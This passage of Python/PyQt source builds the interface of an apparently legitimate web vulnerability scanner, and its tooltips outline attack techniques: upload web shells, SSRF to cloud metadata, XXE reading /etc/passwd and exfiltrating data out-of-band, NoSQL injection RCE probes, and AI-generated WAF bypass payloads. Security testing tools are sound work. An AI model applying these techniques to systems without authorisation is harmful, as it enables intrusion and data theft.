        main_splitter.setStretchFactor(1, 1)

        layout.addWidget(main_splitter)

        self.apply_styling()
    
    def create_toolbar(self) -> QWidget:
        """Two-row toolbar: (1) controls & action buttons, (2) scan type selectors."""
        toolbar = QWidget()
        toolbar.setFixedHeight(88)
        outer = QVBoxLayout(toolbar)
        outer.setContentsMargins(10, 4, 10, 4)
        outer.setSpacing(2)

        # ── Row 1: title | progress | status | boost | start | stop | config | clear ──
        row1 = QHBoxLayout()
        row1.setSpacing(6)

        title = QLabel("⌕ Active Scanner")
        title.setFont(QFont("Segoe UI", 12, QFont.Bold))
        row1.addWidget(title)

        row1.addStretch()

        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        self.progress_bar.setMaximum(0)
        self.progress_bar.setFixedWidth(140)
        self.progress_bar.setFixedHeight(18)
        row1.addWidget(self.progress_bar)

        self.scan_status_label = QLabel("Ready")
        self.scan_status_label.setStyleSheet(f"color: {COLOR_TEXT_MUTED}; padding: 0 6px;")
        row1.addWidget(self.scan_status_label)

        _sep1 = QLabel("|")
        _sep1.setStyleSheet(f"color: {COLOR_BORDER};")
        row1.addWidget(_sep1)

        self.boost_mode_checkbox = QCheckBox("⚡ Boost")
        self.boost_mode_checkbox.setChecked(False)
        self.boost_mode_checkbox.setToolTip(
            "⚡ Boost Mode — sends payloads in parallel using a thread pool.\n\n"
            "Relationship with Speed Preset (⚙ config):\n"
            "  • Boost controls PARALLELISM (sequential vs parallel threads)\n"
            "  • Speed Preset controls PER-REQUEST settings (timeout, delay, retries)\n"
            "  • They are independent and stack — e.g. Fast+Boost = fastest overall\n\n"
            "⚠  Slow preset + Boost ON: parallelism is active but per-request delay\n"
            "    and retries still apply (may partially offset the speed gain).\n\n"
            "Time-based blind payloads always run sequentially regardless of Boost."
        )
        self.boost_mode_checkbox.stateChanged.connect(self.on_boost_mode_changed)
        row1.addWidget(self.boost_mode_checkbox)

        self.ai_payloads_checkbox = QCheckBox(" AI Payloads")
        self.ai_payloads_checkbox.setChecked(False)
        self.ai_payloads_checkbox.setToolTip(
            "✨ AI Payload Suggester\n\n"
            "After the initial probe phase, sends the WAF/filter fingerprint\n"
            "and probe response snippet to the configured AI provider to generate\n"
            "targeted bypass payloads tailored to the detected defenses.\n\n"
            "Context sent to AI per injection point:\n"
            "  • Parameter name & current value\n"
            "  • Last probe response snippet (800 chars)\n"
            "  • WAF/filter fingerprint (e.g. 'HTML-encodes < >', 'blocks script')\n\n"
            "The AI-generated payloads are prepended to the static wordlist so\n"
            "they run first — higher signal-to-noise ratio than cycling blindly\n"
            "through generic lists.\n\n"
            "Requires an AI provider configured in Edit → Tool Settings.\n"
            "Adds ~1–3 s per injection point for the AI API call."
        )
        row1.addWidget(self.ai_payloads_checkbox)

        _sep2 = QLabel("|")
        _sep2.setStyleSheet(f"color: {COLOR_BORDER};")
        row1.addWidget(_sep2)

        # Start scan button — green
        self.start_scan_btn = QPushButton("▶ Start Scan")
        self.start_scan_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: #2e7d32;
                color: #ffffff;
                border: none;
                padding: 6px 14px;
                border-radius: 4px;
                font-weight: bold;
            }}
            QPushButton:hover {{ background-color: #388e3c; }}
            QPushButton:pressed {{ background-color: #1b5e20; }}
            QPushButton:disabled {{ background-color: {COLOR_BORDER}; color: {COLOR_TEXT_MUTED}; }}
        """)
        self.start_scan_btn.clicked.connect(self.start_scan)
        row1.addWidget(self.start_scan_btn)

        # Stop scan button — red
        self.stop_scan_btn = QPushButton("⏹ Stop")
        self.stop_scan_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: #b71c1c;
                color: #ffffff;
                border: none;
                padding: 6px 14px;
                border-radius: 4px;
                font-weight: bold;
            }}
            QPushButton:hover {{ background-color: #c62828; }}
            QPushButton:pressed {{ background-color: #7f0000; }}
            QPushButton:disabled {{ background-color: {COLOR_BORDER}; color: {COLOR_TEXT_MUTED}; }}
        """)
        self.stop_scan_btn.clicked.connect(self.stop_scan)
        self.stop_scan_btn.setEnabled(False)
        row1.addWidget(self.stop_scan_btn)

        # Next button — only visible during One-by-one step mode
        self.step_next_btn = QPushButton("↠ Next")
        self.step_next_btn.setToolTip(
            "Send the next probe request.\n"
            "Only active in 🪜 One-by-one mode."
        )
        self.step_next_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: #1565c0;
                color: #ffffff;
                border: none;
                padding: 6px 14px;
                border-radius: 4px;
                font-weight: bold;
            }}
            QPushButton:hover {{ background-color: #1976d2; }}
            QPushButton:pressed {{ background-color: #0d47a1; }}
            QPushButton:disabled {{ background-color: {COLOR_BORDER}; color: {COLOR_TEXT_MUTED}; }}
        """)
        self.step_next_btn.setVisible(False)
        self.step_next_btn.setEnabled(False)
        self.step_next_btn.clicked.connect(self._on_step_next_clicked)
        row1.addWidget(self.step_next_btn)

        # Scan Config button (⚙ icon only)
        self.scan_config_btn = QPushButton("⚙")
        self.scan_config_btn.setToolTip("Scan Configuration — request speed, delays, concurrency, timeouts")
        self.scan_config_btn.setFixedWidth(34)
        self.scan_config_btn.setFixedHeight(30)
        self.scan_config_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: #3a3a3a;
                color: {COLOR_TEXT_BRIGHT};
                border: 1px solid {COLOR_BORDER};
                border-radius: 4px;
                font-size: 15px;
                padding: 0px;
            }}
            QPushButton:hover {{ background-color: #505050; }}
            QPushButton:pressed {{ background-color: #2a2a2a; }}
        """)
        self.scan_config_btn.clicked.connect(self.show_scan_config_dialog)
        row1.addWidget(self.scan_config_btn)

        # Clear dropdown menu
        clear_menu_btn = QPushButton("🗑 Clear ▼")
        clear_menu = QMenu()
        clear_results_action = clear_menu.addAction("Clear Results & Logs")
        clear_results_action.triggered.connect(self.clear_results_and_logs)
        clear_menu.addSeparator()
        clear_queue_action = clear_menu.addAction("Clear Queue")
        clear_queue_action.triggered.connect(self.clear_queue)
        clear_menu.addSeparator()
        clear_traffic_action = clear_menu.addAction("Clear Traffic")
        clear_traffic_action.triggered.connect(self.clear_traffic)
        clear_menu.addSeparator()
        clear_all_action = clear_menu.addAction("Clear All")
        clear_all_action.triggered.connect(self.clear_all)
        clear_menu_btn.setMenu(clear_menu)
        row1.addWidget(clear_menu_btn)

        # Payloads browser button
        payloads_btn = QPushButton("☰ Payloads")
        payloads_btn.setToolTip(
            "Browse all payloads used by each scan type.\n\n"
            "Shows probe payloads, fingerprint payloads, error patterns\n"
            "and technique notes for: SSTI · SQLi · XSS · CMDi · LFI\n"
            "SSRF · XXE · NoSQLi · CORS · Open Redirect"
        )
        payloads_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: #2d3748;
                color: #a0aec0;
                border: 1px solid {COLOR_BORDER};
                border-radius: 4px;
                padding: 5px 12px;
                font-size: 12px;
            }}
            QPushButton:hover {{ background-color: #3a4a5c; color: {COLOR_TEXT_BRIGHT}; }}
            QPushButton:pressed {{ background-color: #1a2332; }}
        """)
        payloads_btn.clicked.connect(self._open_payloads_browser)
        row1.addWidget(payloads_btn)

        outer.addLayout(row1)

        # ── Thin divider ─────────────────────────────────────────────────────
        divider = QFrame()
        divider.setFrameShape(QFrame.HLine)
        divider.setStyleSheet(f"color: {COLOR_BORDER}; max-height: 1px;")
        outer.addWidget(divider)

        # ── Row 2: scan type checkboxes ──────────────────────────────────────
        row2 = QHBoxLayout()
        row2.setSpacing(4)

        scan_lbl = QLabel("Scan Types:")
        scan_lbl.setFont(QFont("Segoe UI", 8, QFont.Bold))
        row2.addWidget(scan_lbl)

        # All / None toggle
        self._all_scans_btn = QPushButton("All")
        self._all_scans_btn.setFixedWidth(38)
        self._all_scans_btn.setFixedHeight(22)
        self._all_scans_btn.setCheckable(True)
        self._all_scans_btn.setToolTip("Select / deselect all scan types")
        self._all_scans_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: #3a3a3a;
                color: {COLOR_TEXT_BRIGHT};
                border: 1px solid {COLOR_BORDER};
                border-radius: 3px;
                font-size: 9px;
                padding: 1px;
            }}
            QPushButton:checked {{ background-color: {COLOR_ACCENT}; }}
            QPushButton:hover {{ background-color: #505050; }}
        """)
        self._all_scans_btn.clicked.connect(self._toggle_all_scans)
        row2.addWidget(self._all_scans_btn)

        # 🔥 40x Bypass and WAF bypass are now the dedicated "🛡 WAF Bypass" tab.
        # Use HTTP History → right-click → "🛡 Send to WAF Bypass" to access it.

        self.xss_checkbox = QCheckBox("XSS")
        self.xss_checkbox.setChecked(False)
        row2.addWidget(self.xss_checkbox)

        self.sqli_checkbox = QCheckBox("SQLi")
        self.sqli_checkbox.setChecked(False)
        row2.addWidget(self.sqli_checkbox)

        self.lfi_checkbox = QCheckBox("LFI")
        self.lfi_checkbox.setChecked(False)
        self.lfi_checkbox.setToolTip(
            "Local File Inclusion / Path Traversal scan\n"
            "Requires lfi_wordlist= in Hunt-Proxy.config"
        )
        row2.addWidget(self.lfi_checkbox)

        self.cmdi_checkbox = QCheckBox("CMDi")
        self.cmdi_checkbox.setChecked(False)
        self.cmdi_checkbox.setToolTip(
            "OS Command Injection scan\n"
            "Tests output-based and time-based blind injection"
        )
        row2.addWidget(self.cmdi_checkbox)

        self.idor_checkbox = QCheckBox("IDOR")
        self.idor_checkbox.setChecked(False)
        self.idor_checkbox.setToolTip(
            "Insecure Direct Object Reference scan\n"
            "Mutates integer IDs, UUIDs, base64 IDs, and slugs\n"
            "Tests URL params, POST body, path segments, cookies\n"
            "Also sends one unauthenticated probe per parameter"
        )
        row2.addWidget(self.idor_checkbox)

        self.upload_checkbox = QCheckBox("Upload")
        self.upload_checkbox.setChecked(False)
        self.upload_checkbox.setToolTip(
            "File Upload vulnerability scan (12 test cases)\n"
            "TC-1:  Blacklist bypass (alt extensions: phtml, phar, asp...)\n"
            "TC-2:  Whitelist bypass (trailing chars, URL-encoding,\n"
            "       semicolons, multibyte unicode, recursive-strip)\n"
            "TC-3:  Content-Type bypass\n"
            "TC-4:  Magic bytes bypass (GIF89a, PNG header prepended)\n"
            "TC-5:  EXIF metadata shell\n"
            "TC-6:  Config file upload (.htaccess / web.config)\n"
            "TC-7:  SVG payloads (XSS / XXE / SSRF)\n"
            "TC-8:  Filename injection (SQLi / CMDi / LFI / XSS)\n"
            "TC-9:  Tiny shells (size restriction bypass)\n"
            "TC-10: Zip slip (path traversal inside archive)\n"
            "TC-11: PUT method upload (common static dirs)\n"
            "TC-12: Path traversal in filename (../shell.php variants)"
        )
        row2.addWidget(self.upload_checkbox)

        self.ssrf_checkbox = QCheckBox("SSRF")
        self.ssrf_checkbox.setChecked(False)
        self.ssrf_checkbox.setToolTip(
            "Server-Side Request Forgery scan\n"
            "Phase 1 : Loopback / server-side (127.0.0.1, localhost, ::1, ...)\n"
            "Phase 2 : Internal network back-end enumeration\n"
            "Phase 3 : Blacklist-bypass obfuscation (decimal, octal, hex, ...)\n"
            "Phase 4 : Whitelist-bypass URL confusion (@ trick, # fragment, ...)\n"
            "Phase 5 : Open-redirect chaining\n"
            "Phase 6 : Blind SSRF via OOB (interactsh / Collaborator)\n"
            "Phase 7 : Referer header SSRF\n"
            "Phase 8 : Smart value-aware sweep\n"
            "          (subnet + port scan + path fuzz + protocol swap)\n"
            "Phase 9 : Partial URL / hostname-only params\n"
            "Phase 10: Cloud metadata (AWS, GCP, Azure, DO, Oracle) + protocol smuggling"
        )
        row2.addWidget(self.ssrf_checkbox)

        self.xxe_checkbox = QCheckBox("XXE")
        self.xxe_checkbox.setChecked(False)
        self.xxe_checkbox.setToolTip(
            "XML External Entity (XXE) Injection scan\n"
            "Phase 1 : Classic file retrieval via external entity\n"
            "          (file:///etc/passwd, win.ini, etc.)\n"
            "Phase 2 : XXE to SSRF (internal HTTP requests)\n"
            "Phase 3 : Blind XXE via OOB — regular entity (interactsh)\n"
            "Phase 4 : Blind XXE via XML parameter entities (% syntax)\n"
            "Phase 5 : Blind OOB data exfiltration via malicious DTD\n"
            "Phase 6 : Error-based XXE (parser error leaks file contents)\n"
            "Phase 7 : Local DTD repurposing (no OOB / no egress needed)\n"
            "Phase 8 : XInclude attack (no DOCTYPE control required)\n"
            "Phase 9 : Content-Type conversion (JSON/form → text/xml)\n"
            "Phase 10: SVG file upload XXE\n"
            "Phase 11: SAML / SSO injection\n"
            "Phase 12: Billion Laughs entity-expansion DoS probe\n"
            "Phase 13: SOAP endpoint discovery + XXE probe\n"
            "\n"
            "Phases 3-5 use interactsh OAST — configure when prompted."
        )
        row2.addWidget(self.xxe_checkbox)

        self.nosqli_checkbox = QCheckBox("NoSQLi")
        self.nosqli_checkbox.setChecked(False)
        self.nosqli_checkbox.setToolTip(
            "NoSQL Injection scan (MongoDB)\n"
            "Phase 1 : Syntax injection — fuzz strings, single-char probes,\n"
            "          boolean-blind (true/false condition diff), null-byte truncation\n"
            "Phase 2 : Operator injection — $ne, $gt, $regex, $in, $exists, $where\n"
            "          URL bracket notation (param[$ne]=) + POST body variants\n"
            "          Authentication bypass via operator objects\n"
            "Phase 3 : $where JavaScript injection — boolean & field-name extraction\n"
            "Phase 4 : Timing-based blind — sleep(5000), busy-loop delays\n"
            "Phase 5 : JSON body operator injection — auth bypass + $regex extraction\n"
            "Phase 6 : RCE probes — db.insert(), mapReduce() command injection"
        )
        row2.addWidget(self.nosqli_checkbox)

        self.cors_checkbox = QCheckBox("CORS")
        self.cors_checkbox.setChecked(False)
        self.cors_checkbox.setToolTip(
            "CORS Misconfiguration scan (10 probes)\n"
            "TC-1:  Reflected origin — server echoes any Origin back\n"
            "TC-2:  Suffix-match bypass (evil.target.com accepted)\n"
            "TC-3:  Prefix-match bypass (target.com.evil.com accepted)\n"
            "TC-4:  Null origin (sandboxed iframe attack)\n"
            "TC-5:  Arbitrary subdomain accepted\n"
            "TC-6:  localhost reflection\n"
            "TC-7:  127.0.0.1 loopback reflection\n"
            "TC-8:  Generic third-party origin accepted\n"
            "TC-9:  HTTP origin on HTTPS endpoint\n"
            "TC-10: OPTIONS preflight reflection check\n"
            "Flags ACAC: true + non-self ACAO as HIGH (credential leakage)"
        )
        row2.addWidget(self.cors_checkbox)

        self.open_redirect_checkbox = QCheckBox("OpenRedir")
        self.open_redirect_checkbox.setChecked(False)
        self.open_redirect_checkbox.setToolTip(
            "Open Redirect scan\n"
            "Tests redirect-controlling parameters (url, redirect, next, return, goto, …)\n"
            "with 30+ payloads across multiple bypass categories:\n"
            "  • Absolute URL / protocol-relative / HTTP vs HTTPS\n"
            "  • Slash tricks (// /// backslash)\n"
            "  • URL-encoding / double-encoding\n"
            "  • @ separator and credential tricks\n"
            "  • Fragment / null-byte / CRLF injection\n"
            "  • Whitelist prefix/suffix bypass\n"
            "Detection: inspects raw Location header (allow_redirects=False),\n"
            "JS window.location in body, and meta-refresh redirects.\n"
            "Confidence: HIGH (Location header) / MEDIUM (body JS) / LOW (CRLF)"
        )
        row2.addWidget(self.open_redirect_checkbox)

        self.ssti_checkbox = QCheckBox("SSTI")
        self.ssti_checkbox.setChecked(False)
        self.ssti_checkbox.setToolTip(
            "Server-Side Template Injection (SSTI) scan\n"
            "Injects arithmetic math probes valid across multiple template engines\n"
            "and checks whether the evaluated result (e.g. 49) appears in the response.\n\n"
            "Phase 1 — Polyglot math probes ({{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>, …)\n"
            "Phase 2 — Engine fingerprinting (Jinja2 vs Twig vs Freemarker vs ERB …)\n"
            "Phase 3 — Error-based detection (malformed syntax triggers engine stack-trace)\n"
            "Phase 4 — Code-context break-out (}}{{7*7}}{{ to escape existing expressions)\n\n"
            "Engines detected: Jinja2, Twig, Freemarker, Mako, ERB, EJS, Pebble,\n"
            "  Thymeleaf, Velocity, Smarty, Tornado, Groovy, Nunjucks, Liquid, Pug\n"
            "Injection points: URL params, POST body, JSON fields, Cookies, Headers\n"
            "Confidence: HIGH (≥2 hits or hit+error) / MEDIUM (1 hit or error alone)"
        )
        row2.addWidget(self.ssti_checkbox)

        row2.addStretch()
        outer.addLayout(row2)

        return toolbar
    
    def create_queue_widget(self) -> QWidget:
        """Create scan queue widget"""
        widget = QWidget()
        widget.setMinimumWidth(220)
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(4, 4, 4, 4)
        layout.setSpacing(3)

        # Header row with title + live count badge
        hdr_row = QHBoxLayout()
        hdr_row.setContentsMargins(0, 0, 0, 0)
        header = QLabel("☰ Scan Queue")
        header.setFont(QFont("Segoe UI", 9, QFont.Bold))
        hdr_row.addWidget(header)
        hdr_row.addStretch()
        self._queue_count_label = QLabel("0 items")
        self._queue_count_label.setStyleSheet(f"color: {COLOR_TEXT_MUTED}; font-size: 8pt;")
        hdr_row.addWidget(self._queue_count_label)
        layout.addLayout(hdr_row)
        
        # Queue table
        self.queue_table = QTableWidget()
        self.queue_table.setColumnCount(2)
        self.queue_table.setHorizontalHeaderLabels(["Method", "URL"])

        self.queue_table.setColumnWidth(0, 68)
        self.queue_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        
        self.queue_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.queue_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.queue_table.itemSelectionChanged.connect(self.on_queue_selection_changed)
        self.queue_table.itemDoubleClicked.connect(self.on_queue_double_clicked)
        self.queue_table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.queue_table.customContextMenuRequested.connect(self.show_queue_context_menu)
        
        self.queue_table.setWordWrap(False)
        self.queue_table.horizontalHeader().setStretchLastSection(False)
        layout.addWidget(self.queue_table)
        
        return widget
    
    def create_results_tab(self) -> QWidget:
        """Create results tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(5, 5, 5, 5)
        
        # Header
        self.results_header = QLabel("Select a scan from the queue to view results")
        self.results_header.setFont(QFont("Segoe UI", 10, QFont.Bold))
        layout.addWidget(self.results_header)
        
        # Results text
        self.results_text = QTextEdit()
        self.results_text.setReadOnly(True)
        self.results_text.setFont(QFont("Consolas", 9))
        layout.addWidget(self.results_text)
        
        return widget
    
    def create_logs_tab(self) -> QWidget:
        """Create request logs tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(5, 5, 5, 5)
        
        # Header
        self.logs_header = QLabel("Select a scan from the queue to view logs")
        self.logs_header.setFont(QFont("Segoe UI", 10, QFont.Bold))
        layout.addWidget(self.logs_header)
        
        # Logs text
        self.logs_text = QTextEdit()
        self.logs_text.setReadOnly(True)
        self.logs_text.setFont(QFont("Consolas", 8))
        layout.addWidget(self.logs_text)
        
        return widget
    
    def create_traffic_tab(self) -> QWidget:
        """Create traffic monitoring tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(5, 5, 5, 5)
        
        # Header with controls
        header_layout = QHBoxLayout()
        header = QLabel("🖳 HTTP Traffic Monitor")
        header.setFont(QFont("Segoe UI", 10, QFont.Bold))
        header_layout.addWidget(header)
        
        self.traffic_url_label = QLabel("(All URLs)")
        self.traffic_url_label.setStyleSheet(f"color: {COLOR_TEXT_MUTED};")
        header_layout.addWidget(self.traffic_url_label)
        
        self.show_all_urls_btn = QPushButton("Show All URLs")
        self.show_all_urls_btn.clicked.connect(self.clear_url_filter)
        self.show_all_urls_btn.setMaximumWidth(120)
        self.show_all_urls_btn.setVisible(False)
        header_layout.addWidget(self.show_all_urls_btn)
        
        header_layout.addStretch()
        
        # Status code filter
        header_layout.addWidget(QLabel("Status:"))
        self.status_filter = QComboBox()
        self.status_filter.addItems(["All", "2xx", "3xx", "4xx", "5xx", "Error"])
        self.status_filter.currentTextChanged.connect(self.filter_traffic)
        self.status_filter.setMaximumWidth(100)
        header_layout.addWidget(self.status_filter)
        
        # Text filter
        header_layout.addWidget(QLabel("Filter:"))
        self.traffic_filter = QLineEdit()
        self.traffic_filter.setPlaceholderText("Search URL, payload...")
        self.traffic_filter.textChanged.connect(self.filter_traffic)
        self.traffic_filter.setMaximumWidth(200)
        header_layout.addWidget(self.traffic_filter)

        # Delay filter
        header_layout.addWidget(QLabel("⏱≥"))
        self.delay_filter = QLineEdit()
        self.delay_filter.setPlaceholderText("sec")
        self.delay_filter.setMaximumWidth(50)
        self.delay_filter.setToolTip("Show only requests with response time ≥ N seconds")
        self.delay_filter.textChanged.connect(self.filter_traffic)
        header_layout.addWidget(self.delay_filter)

        # ΔLength filter
        header_layout.addWidget(QLabel("ΔLen≥"))
        self.delta_len_filter = QLineEdit()
        self.delta_len_filter.setPlaceholderText("bytes")
        self.delta_len_filter.setMaximumWidth(60)
        self.delta_len_filter.setToolTip(
            "Show only requests where |response length − baseline| ≥ N bytes.\n"
            "Requires a Baseline request to have been recorded first."
        )
        self.delta_len_filter.textChanged.connect(self.filter_traffic)
        header_layout.addWidget(self.delta_len_filter)
        
        # Auto-scroll toggle
        self.auto_scroll_traffic = QPushButton(" Auto-scroll: ON")
        self.auto_scroll_traffic.setCheckable(True)
        self.auto_scroll_traffic.setChecked(True)
        self.auto_scroll_traffic.clicked.connect(self.toggle_auto_scroll)
        self.auto_scroll_traffic.setMaximumWidth(150)
        header_layout.addWidget(self.auto_scroll_traffic)
        
        # Clear traffic button — icon only to save space
        clear_traffic_btn = QPushButton("🗑")
        clear_traffic_btn.setToolTip("Clear traffic")
        clear_traffic_btn.clicked.connect(self.clear_traffic)
        clear_traffic_btn.setFixedWidth(30)
        header_layout.addWidget(clear_traffic_btn)
        
        layout.addLayout(header_layout)
        
        # Splitter for traffic table and request/response viewer
        traffic_splitter = QSplitter(Qt.Vertical)
        
        # Traffic table
        self.traffic_table = QTableWidget()
        self.traffic_table.setColumnCount(10)
        self.traffic_table.setHorizontalHeaderLabels([
            "#", "Time", "Method", "URL", "Status", "Length", "ΔLen", "Time (s)", "Payload", "Type"
        ])

        self.traffic_table.setColumnWidth(0, 50)
        self.traffic_table.setColumnWidth(1, 80)
        self.traffic_table.setColumnWidth(2, 80)
        self.traffic_table.setColumnWidth(4, 80)
        self.traffic_table.setColumnWidth(5, 80)
        self.traffic_table.setColumnWidth(6, 75)
        self.traffic_table.setColumnWidth(7, 80)
        self.traffic_table.setColumnWidth(8, 160)
        self.traffic_table.setColumnWidth(9, 200)
        self.traffic_table.horizontalHeader().setSectionResizeMode(3, QHeaderView.Stretch)
        
        self.traffic_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.traffic_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.traffic_table.itemSelectionChanged.connect(self.on_traffic_selection_changed)
        self.traffic_table.itemDoubleClicked.connect(self.on_traffic_double_clicked)
        self.traffic_table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.traffic_table.customContextMenuRequested.connect(self.show_traffic_context_menu)
        
        self.traffic_table.setWordWrap(False)
        self.traffic_table.horizontalHeader().setStretchLastSection(False)
        traffic_splitter.addWidget(self.traffic_table)
        
        # Request/Response viewer
        req_resp_widget = QWidget()
        req_resp_layout = QVBoxLayout(req_resp_widget)
        req_resp_layout.setContentsMargins(0, 0, 0, 0)
        
        req_resp_splitter = QSplitter(Qt.Horizontal)
        
        # Request panel
        request_widget = QWidget()
        request_layout = QVBoxLayout(request_widget)
        request_layout.setContentsMargins(5, 5, 5, 5)
        
        request_header = QLabel("🠉 HTTP Request")
        request_header.setFont(QFont("Segoe UI", 9, QFont.Bold))
        request_layout.addWidget(request_header)
        
        self.request_text = QTextEdit()
        self.request_text.setReadOnly(True)
        self.request_text.setFont(QFont("Consolas", 9))
        self.request_highlighter = HttpSyntaxHighlighter(self.request_text.document())
        request_layout.addWidget(self.request_text)
        
        req_resp_splitter.addWidget(request_widget)
        
        # Response panel
        response_widget = QWidget()
        response_layout = QVBoxLayout(response_widget)
        response_layout.setContentsMargins(5, 5, 5, 5)

        # Response header row
        resp_header_row = QHBoxLayout()
        response_header = QLabel("🠋 HTTP Response")
        response_header.setFont(QFont("Segoe UI", 9, QFont.Bold))
        resp_header_row.addWidget(response_header)
        resp_header_row.addStretch()
        response_layout.addLayout(resp_header_row)

        # Response search bar
        resp_search_row = QHBoxLayout()
        self.resp_search_input = QLineEdit()
        self.resp_search_input.setPlaceholderText("⌕ Search in response...")
        self.resp_search_input.setMaximumWidth(260)
        self.resp_search_input.textChanged.connect(self._on_resp_search_changed)
        resp_search_row.addWidget(self.resp_search_input)

        self.resp_auto_scroll_cb = QCheckBox("Auto-scroll to match")
        self.resp_auto_scroll_cb.setChecked(True)
        self.resp_auto_scroll_cb.stateChanged.connect(self._on_resp_search_changed)
        resp_search_row.addWidget(self.resp_auto_scroll_cb)

        self.resp_search_match_label = QLabel("")
        self.resp_search_match_label.setStyleSheet(f"color: {COLOR_TEXT_MUTED}; font-size: 11px;")
        resp_search_row.addWidget(self.resp_search_match_label)
        resp_search_row.addStretch()
        response_layout.addLayout(resp_search_row)

        self.response_text = QTextEdit()
        self.response_text.setReadOnly(True)
        self.response_text.setFont(QFont("Consolas", 9))
        self.response_highlighter = HttpSyntaxHighlighter(self.response_text.document())
        response_layout.addWidget(self.response_text)
        
        req_resp_splitter.addWidget(response_widget)
        
        req_resp_splitter.setSizes([400, 400])
        
        req_resp_layout.addWidget(req_resp_splitter)
        traffic_splitter.addWidget(req_resp_widget)
        
        traffic_splitter.setSizes([300, 400])
        layout.addWidget(traffic_splitter)
        
        return widget
    
    def on_queue_selection_changed(self):
        """Handle queue selection change"""
        selected = self.queue_table.selectedItems()
        if not selected:
            return
        
        row = selected[0].row()
        if row >= len(self.scan_queue):
            return
        
        selected_url = self.scan_queue[row].get("url", "")
        
        # Update results tab
        if row in self.scan_results:
            url = self.scan_queue[row].get("url", "")
            self.results_header.setText(f"Results for: {url}")
            self.results_text.setPlainText(self.scan_results[row])
        else:
            self.results_header.setText("No results yet - Click 'Start Scan' to scan this request")
            self.results_text.setPlainText("")
        
        # Update logs tab
        if row in self.scan_logs:
            url = self.scan_queue[row].get("url", "")
            self.logs_header.setText(f"Request Logs for: {url}")
            self.logs_text.setPlainText(self.scan_logs[row])
        else:
            self.logs_header.setText("No logs yet - Click 'Start Scan' to scan this request")
            self.logs_text.setPlainText("")
        
        # Update traffic filter
        self.current_filtered_url = selected_url
        self.additional_filtered_urls = self.scan_queue[row].get("additional_urls", [])
        short_url = selected_url if len(selected_url) <= 60 else selected_url[:57] + "..."
        self.traffic_url_label.setText(f"(Filtering: {short_url})")
        self.show_all_urls_btn.setVisible(True)
        self.filter_traffic()
    
    # ------------------------------------------------------------------
    # Browser-open helper — method-aware
    # ------------------------------------------------------------------

    def _open_in_browser(self, url: str, method: str = "GET",
                         body: str = "", content_type: str = "") -> str:
        """
        Open a request in the system default browser, fully respecting the
        HTTP method and Content-Type.

        GET / HEAD / DELETE (no meaningful body)
            → webbrowser.open(url) — direct navigation.

        POST / PUT / PATCH with form-encoded body
            → Write a temp HTML file with hidden <input> fields auto-submitted
              via JS. Browser sends a real form POST to the target URL.

        POST / PUT / PATCH with JSON body (or any non-form body)
            → Write a temp HTML page that uses fetch() with the exact method,
              Content-Type header, and raw body. Response status + body are
              rendered inline so the tester can inspect them without DevTools.
              A "Resend" button allows repeated replays.

        Temp files are deleted after 30 s via a daemon thread.
        Returns a short status string for the UI label.
        """
        import webbrowser, tempfile, os, threading
        import html as _html, json as _json, urllib.parse as _up

        method_upper = (method or "GET").upper()
        body_stripped = (body or "").strip()

        # ── GET-like: direct navigation ───────────────────────────────────
        if method_upper in ("GET", "HEAD", "DELETE", "OPTIONS") or not body_stripped:
            webbrowser.open(url)
            return f"✓ Opened [{method_upper}] in browser: {url[:70]}"

        # ── Detect content type ───────────────────────────────────────────
        ct_lc    = (content_type or "").lower()
        is_json  = "application/json" in ct_lc
        is_form  = (
            "application/x-www-form-urlencoded" in ct_lc
            or "multipart/form-data" in ct_lc
        )

        # Auto-detect when Content-Type header is absent
        if not is_json and not is_form:
            try:
                _json.loads(body_stripped)
                is_json = True          # body parses as JSON → treat as JSON
            except (ValueError, TypeError):
                is_form = True          # assume form-encoded

        # ── Branch: form-encoded POST ─────────────────────────────────────
        if is_form:
            fields_html  = ""
            content_note = ""

            try:
                pairs = _up.parse_qsl(body_stripped, keep_blank_values=True)
                if pairs:
                    for k, v in pairs:
                        safe_k = _html.escape(k, quote=True)
                        safe_v = _html.escape(v, quote=True)
                        fields_html += (
                            f'    <input type="hidden" name="{safe_k}"'
                            f' value="{safe_v}">\n'
                        )
                else:
                    raise ValueError("empty parse")
            except Exception:
                safe_v = _html.escape(body_stripped, quote=True)
                fields_html  = (
                    f'    <input type="hidden" name="_raw_body"'
                    f' value="{safe_v}">\n'
                )
                content_note = (
                    "<p style='color:#e8a838;font-size:11px'>"
                    "⚠ Could not parse body — sent as single field "
                    "<code>_raw_body</code>.</p>"
                )

            safe_url    = _html.escape(url, quote=True)
            safe_method = _html.escape(method_upper)
            short_url   = url if len(url) <= 80 else url[:77] + "…"

            html_page = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Replay {safe_method} → {_html.escape(short_url)}</title>
  <style>
    body {{ background:#1a1a2e; color:#e0e0e0;
            font-family:'Segoe UI',monospace; font-size:13px;
            display:flex; flex-direction:column;
            align-items:center; justify-content:center;
            height:100vh; margin:0; }}
    .card {{ background:#16213e; border:1px solid #0f3460;
             border-radius:8px; padding:24px 32px;
             max-width:640px; width:90%; text-align:center; }}
    .badge {{ display:inline-block; background:#e94560; color:#fff;
              border-radius:4px; padding:2px 10px;
              font-weight:bold; font-size:14px; margin-bottom:12px; }}
    .url {{ color:#53d8fb; word-break:break-all; margin:8px 0 16px; }}
    .spinner {{ font-size:28px; }}
  </style>
</head>
<body>
  <div class="card">
    <div class="badge">{safe_method}</div>
    <div class="url">{_html.escape(url)}</div>
    {content_note}
    <div class="spinner">⏳</div>
    <p>Submitting form…</p>
